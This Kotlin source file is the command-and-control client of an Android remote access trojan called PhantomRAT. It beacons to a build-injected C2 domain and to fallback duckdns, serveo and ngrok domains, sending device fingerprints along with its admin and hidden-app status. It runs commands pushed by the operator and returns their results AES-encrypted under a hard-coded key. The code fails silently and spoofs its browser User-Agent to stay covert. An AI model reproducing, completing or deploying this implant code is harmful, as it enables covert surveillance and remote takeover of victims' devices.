package com.phantom.rat.core

import android.content.Context
import android.os.Build
import android.provider.Settings
import android.util.Base64
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.security.SecureRandom
import java.util.*
import java.util.concurrent.TimeUnit
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class C2Client(private val context: Context) {

    companion object {
        // Instead of IP - we use a unique C2 Domain/ID
        // This gets replaced during GitHub Actions build
        private const val C2_DOMAIN = "C2_DOMAIN_PLACEHOLDER"
        private const val C2_PORT = 443
        private const val C2_PATH = "/api/v2/beacon"
        
        // Fallback peer-to-peer discovery domains
        private val FALLBACK_DOMAINS = listOf(
            "phantom-c2.duckdns.org",
            "phantom-c2.serveo.net",
            "phantom-c2.ngrok.io"
        )
        
        private const val AES_KEY = "PhantomRAT_SecretKey2025!!" // 256-bit derived
        private const val BEACON_INTERVAL = 5000L // 5 seconds
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .connectionPool(ConnectionPool(5, 60, TimeUnit.SECONDS))
        .build()

    private val jsonMediaType = "application/json".toMediaType()
    private val secureRandom = SecureRandom()
    private var isConnected = false
    private var currentSessionId: String? = null
    private var beaconJob: Job? = null
    private var commandCallback: ((JSONObject) -> Unit)? = null
    
    private val deviceId: String by lazy {
        generateDeviceId()
    }

    fun setCommandCallback(callback: (JSONObject) -> Unit) {
        commandCallback = callback
    }

    fun connect() {
        if (isConnected) return
        isConnected = true
        
        beaconJob = CoroutineScope(Dispatchers.IO).launch {
            while (isActive) {
                try {
                    val response = sendBeacon()
                    if (response.has("command")) {
                        commandCallback?.invoke(response.getJSONObject("command"))
                    }
                } catch (e: Exception) {
                    // Silent fail - try next fallback
                }
                delay(BEACON_INTERVAL + secureRandom.nextLong(2000))
            }
        }
    }

    fun disconnect() {
        isConnected = false
        beaconJob?.cancel()
    }

    private suspend fun sendBeacon(): JSONObject {
        val beacon = JSONObject().apply {
            put("id", deviceId)
            put("type", "beacon")
            put("timestamp", System.currentTimeMillis())
            put("data", JSONObject().apply {
                put("model", Build.MODEL)
                put("manufacturer", Build.MANUFACTURER)
                put("version", Build.VERSION.RELEASE)
                put("sdk", Build.VERSION.SDK_INT)
                put("battery", getBatteryLevel())
                put("network", getNetworkType())
                put("app_version", "1.0.0")
                put("is_admin", isDeviceAdmin())
                put("is_hidden", isAppHidden())
            })
        }

        val encrypted = encrypt(beacon.toString())
        
        val requestBody = JSONObject().apply {
            put("id", deviceId)
            put("payload", encrypted)
        }.toString().toRequestBody(jsonMediaType)

        var lastException: Exception? = null
        
        // Try primary domain first, then fallbacks
        val domains = listOf(C2_DOMAIN) + FALLBACK_DOMAINS
        for (domain in domains) {
            if (domain.startsWith("C2_DOMAIN") && domain != C2_DOMAIN) continue
            
            try {
                val url = "https://$domain:$C2_PORT$C2_PATH"
                val request = Request.Builder()
                    .url(url)
                    .post(requestBody)
                    .header("User-Agent", "Mozilla/5.0 (Linux; Android ${Build.VERSION.RELEASE}; ${Build.MODEL})")
                    .header("Content-Type", "application/json")
                    .header("X-Device-ID", deviceId)
                    .build()

                val response = withContext(Dispatchers.IO) {
                    client.newCall(request).execute()
                }

                if (response.isSuccessful) {
                    val responseBody = response.body?.string() ?: continue
                    val decrypted = decrypt(responseBody)
                    currentSessionId = deviceId
                    return JSONObject(decrypted)
                }
            } catch (e: Exception) {
                lastException = e
                continue
            }
        }
        
        throw lastException ?: Exception("All C2 endpoints failed")
    }

    fun sendCommandResult(commandId: String, result: JSONObject) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val data = JSONObject().apply {
                    put("id", deviceId)
                    put("type", "result")
                    put("command_id", commandId)
                    put("result", encrypt(result.toString()))
                }

                val request = Request.Builder()
                    .url("https://$C2_DOMAIN:$C2_PORT/api/v2/result")
                    .post(data.toString().toRequestBody(jsonMediaType))
                    .header("X-Device-ID", deviceId)
                    .build()

                client.newCall(request).execute()
            } catch (_: Exception) {}
        }
    }

    private fun generateDeviceId(): String {
        val prefs = context.getSharedPreferences("phantom_prefs", Context.MODE_PRIVATE)
        var id = prefs.getString("device_id", null)
        
        if (id == null) {
            val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
            val serial = Build.SERIAL ?: "unknown"
            val random = UUID.randomUUID().toString()
            
            val raw = "$androidId|$serial|$random|${System.currentTimeMillis()}"
            id = Base64.encodeToString(
                raw.toByteArray(), 
                Base64.NO_WRAP or Base64.NO_PADDING
            ).take(32)
            
            prefs.edit().putString("device_id", id).apply()
        }
        
        return id
    }

    fun getDeviceId(): String = deviceId

    private fun encrypt(data: String): String {
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val key = SecretKeySpec(AES_KEY.toByteArray().let { 
            java.util.Arrays.copyOf(it, 32) 
        }, "AES")
        val iv = ByteArray(12).also { secureRandom.nextBytes(it) }
        cipher.init(Cipher.ENCRYPT_MODE, key, GCMParameterSpec(128, iv))
        val encrypted = cipher.doFinal(data.toByteArray())
        val combined = iv + encrypted
        return Base64.encodeToString(combined, Base64.NO_WRAP)
    }

    private fun decrypt(data: String): String {
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val key = SecretKeySpec(AES_KEY.toByteArray().let {
            java.util.Arrays.copyOf(it, 32)
        }, "AES")
        val decoded = Base64.decode(data, Base64.NO_WRAP)
        val iv = decoded.copyOfRange(0, 12)
        val encrypted = decoded.copyOfRange(12, decoded.size)
        cipher.init(Cipher.DECRYPT_MODE, key, GCMParameterSpec(128, iv))
        return String(cipher.doFinal(encrypted))
    }

    private fun getBatteryLevel(): Int {
        val intent = context.registerReceiver(null, android.content.IntentFilter(
            android.content.Intent.ACTION_BATTERY_CHANGED))
        val level = intent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = intent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
        return if (level >= 0 && scale > 0) (level * 100) / scale else -1
    }

    private fun getNetworkType(): String {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
        val network = cm.activeNetwork ?: return "none"
        val caps = cm.getNetworkCapabilities(network) ?: return "none"
        return when {
            caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) -> "wifi"
            caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) -> "mobile"
            else -> "other"
        }
    }

    private fun isDeviceAdmin(): Boolean {
        val dam = context.getSystemService(Context.DEVICE_ADMIN_SERVICE) as android.app.admin.DevicePolicyManager
        val component = android.content.ComponentName(context, AdminReceiver::class.java)
        return dam.isAdminActive(component)
    }

    private fun isAppHidden(): Boolean {
        val pm = context.packageManager
        return try {
            pm.getLaunchIntentForPackage(context.packageName) == null
        } catch (_: Exception) {
            false
        }
    }
}
